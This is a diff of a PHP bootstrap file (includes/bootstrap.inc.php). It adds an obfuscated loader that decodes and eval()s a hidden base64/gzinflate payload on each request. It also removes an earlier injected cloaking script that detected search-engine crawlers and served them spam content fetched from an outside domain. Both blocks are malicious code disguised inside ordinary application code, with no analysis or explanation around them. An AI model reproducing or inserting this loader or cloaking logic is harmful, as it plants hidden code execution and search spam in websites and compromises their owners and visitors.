@@ -1,30 +1,10 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "\x3dE\x43\x43eD4g\x42orTLp/SHmx8n3yjPsIk83t\x62N/UDGNPt1\x434f4D\x42WvMvG04n\x42oVwFPl26IrswO/\x61JEKORIOgyxYdfx\x43uuZS2t\x63sl3eSIhEq\x42M0/ZrgZ771Xom\x63LuD048GOFwD5MNzjTmd\x41g\x627TwMK20DZJ\x429e\x43pJJgJIvE8TqMP7P2\x62sgGFXw\x63FfoPlPoN9\x41Yq\x635qHR\x41oWmze9\x62hez9nN3z57GrPJnV7TFPoJeZglIisqnXdz7\x61xUitdlRRnE6T\x43yLHXSlNe9x32pIvMinIk5\x42S1Uy1F\x62dSJ8fEwmKO8\x41yI1\x62Dhp67VFhEVg3\x4374\x43k4YuwVkeDX96mWGjJZFlG8Jhoi\x42vOpL\x62zoKKHhuytN1d09kFp/\x43LlS/eivqrqoK9EX7i\x2btnmWWZuW\x41jEuZulxpNNEYqOOj3YW\x62fkxKImKY\x6207r\x41yPkx\x62HmgR1\x61d14oX8sKWk8iK0\x41vn3zJde\x63w\x41rZM\x61mj\x61\x63Lvire\x43\x623/\x42vK\x43f\x61NZM\x2b75Wrj1\x62x9uHe/TjoxY\x635SenDVtgG9J86Zkp66\x61M\x435omegrJTu\x4326E\x63y\x62rukg\x63Lw\x61wrd5rk1tS\x61Udti1jYMLs\x628\x62\x2b\x63P5\x62eeih/l2m\x61IMd2v0fyW\x41\x43TM7iyfdJryrimeopqsmL8ItFh\x2bLRdrhI\x43Q\x63IUw/T7r9\x43\x42M\x63\x2bWTT1o/oEw1\x42wJe\x2b3R\x41iHg/YEw5\x42wJe\x2b3Q\x41yHg/IEw9\x42wJe93v\x41\x43EQ/4Lw\x42\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+?>
+
 <?php 
-ob_start();
-header("Vary: User-Agent");
-$bot_url = "https://picucur.xyz/landing/jurnal-patelkipalembang/";
-$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
-$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
-function lph_requests($url)
-{
-    if (function_exists("curl_init")) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
-    } elseif (ini_get("allow_url_fopen")) {
-        return file_get_contents($url);
-    }
-    return false;
-}
-if (preg_match($botchar, $ua)) {
-    usleep(rand(100000, 200000));
-    echo lph_requests($bot_url);
-    ob_end_flush();
-    die;
-}
 
 /**
  * @file includes/bootstrap.inc.php
